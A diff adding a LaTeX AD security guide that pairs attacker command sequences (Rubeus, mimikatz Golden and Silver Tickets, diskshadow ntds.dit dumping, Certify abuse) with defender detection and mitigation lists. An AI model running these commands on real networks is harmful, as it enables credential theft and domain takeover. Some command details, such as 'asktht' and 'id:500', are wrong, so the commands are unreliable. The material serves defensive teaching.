@@ -1,0 +1,224 @@
+\section{1. Resource-Based Constrained Delegation (RBCD)}
+
+\subsection{Attacker View}
+RBCD allows a computer object in AD to impersonate users to a specific service. By setting the \texttt{msds-allowedtoactonbehalfofotheridentity} attribute on a target machine, an attacker can use their controlled machine account to request service tickets from the Kerberos Distribution Center (KDC) on behalf of privileged users.
+
+\begin{lstlisting}
+# Set msds-allowedtoactonbehalfofotheridentity on target
+Get-DomainComputer TargetMachine | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
+
+# Get RC4 hash of controlled machine account password
+Rubeus.exe hash /password:'p@ssword!'
+
+# Impersonate Administrator
+Rubeus.exe s4u /user:<MachineAccountName> /rc4:<RC4Hash> `
+/impersonateuser:Administrator /msdsspn:cifs/TargetMachine.domain `
+/domain:domain /ptt
+
+# Access administrative share
+dir \\TargetMachine.domain\C$
+\end{lstlisting}
+
+Without having the password or hash of the \texttt{TRUSTED\_TO\_AUTH\_FOR\_DELEGATION} account:
+\begin{lstlisting}
+# Request a valid TGT for the account using Kerberos
+Rubeus.exe tgtdeleg /nowrap
+\end{lstlisting}
+
+\textbf{Impact:} Full impersonation of privileged accounts (e.g., Domain Admin) to specific services without needing the password.
+
+\subsection{Defender View}
+\begin{itemize}
+    \item \textbf{Detection:}
+    \begin{itemize}
+        \item Monitor for changes to \texttt{msds-allowedtoactonbehalfofotheridentity} in AD audit logs.
+        \item Look for abnormal \texttt{S4U2Self / S4U2Proxy} ticket requests, especially for high-privilege accounts.
+        \item Use SIEM rules to catch new delegation configurations outside standard provisioning workflows.
+    \end{itemize}
+    \item \textbf{Mitigation:}
+    \begin{itemize}
+        \item Limit delegation permissions to only specific, necessary accounts.
+        \item Apply \textbf{Privileged Account Protection} (Protected Users group) to prevent delegations.
+        \item Disable RBCD unless explicitly required.
+    \end{itemize}
+\end{itemize}
+
+\section{2. Backup Operators Group Abuse}
+
+\subsection{Attacker View}
+Members of the \textbf{Backup Operators} group have the \texttt{SeBackupPrivilege}, allowing them to read any file, including the DC's \texttt{ntds.dit} database and \texttt{SYSTEM} hive.
+
+\textbf{Steps:}
+\begin{lstlisting}
+# Create diskshadow script
+set context persistent nowriters
+set metadata c:\windows\system32\spool\drivers\color\example.cab
+set verbose on
+begin backup
+add volume c: alias mydrive
+create
+expose %mydrive% w:
+end backup
+
+# Run diskshadow script
+diskshadow /s script.txt
+
+# Load DLLs for backup API access
+Import-Module .\SeBackupPrivilegeCmdLets.dll
+Import-Module .\SeBackupPrivilegeUtils.dll
+Set-SeBackupPrivilege
+
+# Copy ntds.dit from shadow copy
+Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\Path\ntds.dit -Overwrite
+
+# Dump SYSTEM hive
+reg save HKLM\SYSTEM c:\temp\system.hive
+\end{lstlisting}
+
+\textbf{Impact:} Dumping \texttt{ntds.dit} → extracting all domain user hashes → Pass-the-Hash (PtH) → Domain Admin compromise.
+
+\subsection{Defender View}
+\begin{itemize}
+    \item \textbf{Detection:}
+    \begin{itemize}
+        \item Monitor for \texttt{diskshadow.exe} execution and shadow copy creation from non-backup servers.
+        \item Detect loading of custom DLLs like \texttt{SeBackupPrivilegeCmdLets.dll}.
+        \item Alert on access to \texttt{C:\textbackslash Windows\textbackslash NTDS\textbackslash ntds.dit} outside normal processes.
+    \end{itemize}
+    \item \textbf{Mitigation:}
+    \begin{itemize}
+        \item Remove unnecessary users from the Backup Operators group.
+        \item Use \textit{Just Enough Administration (JEA)} and \textit{Just-in-Time (JIT)} access for backup tasks.
+        \item Implement File Integrity Monitoring (FIM) for sensitive files.
+    \end{itemize}
+\end{itemize}
+
+\section{3. SID History Abuse}
+
+\subsection{Attacker View}
+If \textit{SID filtering} is disabled between child and root domains, attackers can forge Kerberos tickets containing elevated SIDs from the root domain.
+
+\textbf{Steps:}
+\begin{lstlisting}
+Get-DomainSID -Domain current.root.domain.local
+Get-DomainSID -Domain root.domain.local
+
+mimikatz kerberos::golden /user:Administrator `
+/domain:current.root.domain.local /sid:<CurrentDomainSID> `
+/krbtgt:<krbtgtHash> /sids:<EnterpriseAdminsSID> `
+/startoffset:0 /endin:600 /renewmax:10080 `
+/ticket:\path\golden.kirbi
+
+mimikatz kerberos::ptt \path\golden.kirbi
+\end{lstlisting}
+
+\textbf{Impact:} Root domain compromise from a child domain toehold.
+
+\subsection{Defender View}
+\begin{itemize}
+    \item \textbf{Detection:}
+    \begin{itemize}
+        \item Monitor for Kerberos tickets containing unexpected \texttt{SIDHistory} values.
+        \item Alert on ticket requests for accounts from other domains with elevated SIDs.
+    \end{itemize}
+    \item \textbf{Mitigation:}
+    \begin{itemize}
+        \item Enable SID filtering between domains.
+        \item Regularly audit trust relationships for excessive or outdated configurations.
+    \end{itemize}
+\end{itemize}
+
+\section{4. AD CS Exploitation}
+
+\subsection{Attacker View}
+Misconfigured \textit{Certificate Templates} can allow any authenticated user to request a certificate for a privileged account (ESC1–ESC8).
+
+\textbf{Steps:}
+\begin{lstlisting}
+Certify.exe find /vulnerable /quiet
+
+Certify.exe request /template:<TemplateName> /quiet `
+/ca:"<CA Name>" /domain:<domain.com> `
+/altname:<DA AltName> /machine
+
+# Combine cert.pem and convert to PKCS#12
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+
+# Use certificate for Kerberos auth
+Rubeus.exe asktht /user:<DA AltName> /domain:<domain.com> `
+/dc:<DC> /certificate:<cert.pfx> /nowrap /ptt
+\end{lstlisting}
+
+\textbf{Impact:} Persistent Domain Admin access without touching passwords or hashes.
+
+\subsection{Defender View}
+\begin{itemize}
+    \item \textbf{Detection:}
+    \begin{itemize}
+        \item Monitor for certificate requests with alternate UPNs or SANs.
+        \item Use SIEM to alert on PKI enrollment events from unusual accounts.
+    \end{itemize}
+    \item \textbf{Mitigation:}
+    \begin{itemize}
+        \item Remove \texttt{ENROLLEE\_SUPPLIES\_SUBJECT} where unnecessary.
+        \item Restrict template enrollment to specific groups.
+        \item Enable AD CS auditing and monitor CA database activity.
+    \end{itemize}
+\end{itemize}
+
+\section{5. Golden Ticket Attack}
+
+\subsection{Attacker View}
+Once an attacker has the \texttt{krbtgt} account hash, they can forge TGTs for any account with any group membership.
+
+\textbf{Steps:}
+\begin{lstlisting}
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator `
+/domain:<DomainName> /sid:<DomainSID> `
+/krbtgt:<krbtgtHash> id:500 /groups:512 `
+/startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+\end{lstlisting}
+
+\textbf{Impact:} Unlimited persistence until the \texttt{krbtgt} password is reset \textbf{twice}.
+
+\subsection{Defender View}
+\begin{itemize}
+    \item \textbf{Detection:}
+    \begin{itemize}
+        \item Look for TGTs with unusually long lifespans or tickets issued for inactive accounts.
+    \end{itemize}
+    \item \textbf{Mitigation:}
+    \begin{itemize}
+        \item Regularly reset the \texttt{krbtgt} account password (twice).
+        \item Follow tiered administration and limit Domain Admin exposure.
+    \end{itemize}
+\end{itemize}
+
+\section{6. Silver Ticket Attack}
+
+\subsection{Attacker View}
+A Silver Ticket Attack allows attackers to forge Kerberos service tickets (TGS) without contacting the domain controller, enabling access to specific services like CIFS or HTTP using only the service account's NTLM hash.
+
+\textbf{Steps:}
+\begin{lstlisting}
+Invoke-Mimikatz -Command '"kerberos::golden /domain:<DomainName> `
+/sid:<DomainSID> /target:<TargetMachine> /service:<ServiceType> `
+/rc4:<SPN_Account_NTLM_Hash> /user:<UserToImpersonate> /ptt"'
+\end{lstlisting}
+
+\textbf{Impact:} Stealthy persistence against specific services; avoids DC interaction and TGT request detection.
+
+\subsection{Defender View}
+\begin{itemize}
+    \item \textbf{Detection:}
+    \begin{itemize}
+        \item Look for TGS-REQ events without a matching TGT request.
+        \item Unusual service ticket behavior (e.g., from unexpected sources).
+    \end{itemize}
+    \item \textbf{Mitigation:}
+    \begin{itemize}
+        \item Regularly rotate service account passwords.
+        \item Use gMSAs (Group Managed Service Accounts).
+        \item Restrict service account privileges and monitor SPN registrations.
+    \end{itemize}
+\end{itemize}
